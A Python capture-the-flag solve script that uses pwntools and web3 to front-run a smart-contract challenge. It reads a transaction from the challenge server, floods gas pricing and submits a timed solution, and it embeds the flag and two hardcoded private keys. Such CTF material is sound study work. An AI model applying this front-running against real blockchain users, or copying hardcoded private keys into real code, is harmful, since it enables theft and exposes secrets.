from pwn import *
import time
from web3 import Web3
from solve import solve_challenge

# dice{fr0ntrunn1ng_1s_n0t_ju5t_f0r_s4ndw1ch1ng_f8d9f834}

private_key0 = 'd4390497993b20ceca1f75257592f4c028dceeea24d8086b0352d8e9554841c2'
address0 = '0x02133A4096E121CD52A19fc90a5d75EB2B8F9F79'
private_key1 = '405513135f7d15095a2dfdee9f3c89fc31450b4cef5b800f1daf614357df781e'
address1 = '0x5D62437aAdabB397A78e81F483068b0D9660fC14'

rpc = 'https://floordrop-rpc.hpmv.dev/'
web3 = Web3(Web3.HTTPProvider(rpc))
my_nonce = web3.eth.get_transaction_count(address0)

TX = {
    'nonce': my_nonce,
    'value': 0,
    'gas': 2000000,
    'gasPrice': 2000000016,
    'to': address1,
    'chainId': 133713371337
}

signed_tx = web3.eth.account.sign_transaction(TX, private_key0)

context.log_level = 'DEBUG'
r = remote('mc.ax', 32123)
r.sendline(b'2')
r.recvuntil(b'deployed at ')
contract = r.recvline().strip(b'\n').decode('utf-8')
print(time.ctime())
print(contract)

r.recvuntil(b'nonce: ')
nonce = r.recvline().strip(b'\n')
print(nonce)
assert nonce.startswith(b'0x') and len(nonce) == 66
nonce = nonce[2:].decode('utf-8')

# r.recvuntil(b'called with: ')
# chall = r.recvline().strip(b'\n')
# print(chall)

r.recvuntil(b'Sent setChallenge transaction ')
txhash = r.recvuntil(b';').strip(b';').decode('utf-8')
print(txhash)
tx = web3.eth.get_transaction(bytes.fromhex(txhash[2:]))
print(tx)
assert tx.input.hex()[:10] == '0x26635c72'
chall = int(tx.input.hex()[-64:], 16)

print(time.ctime())
tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
print(f"Transaction Hash: {tx_hash.hex()}")
print(chall)

now = time.time()
sol = solve_challenge(int(chall))
sol = sol.to_bytes((sol.bit_length() + 7) // 8, 'big').hex()
# print(sol)
print(time.time() - now)

TX['gasPrice'] = 2000000020
TX['to'] = contract
TX['nonce'] = my_nonce + 1
TX['data'] = '0x4d13029f0000000000000000000000000000000000000000000000000000000000000040' + nonce + \
        '%064x' % (len(sol) // 2) + sol

r.recvuntil(b'Sent expireChallenge transaction')
print(time.ctime())
signed_tx = web3.eth.account.sign_transaction(TX, private_key0)
tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
print(f"Transaction Hash: {tx_hash.hex()}")
r.interactive()
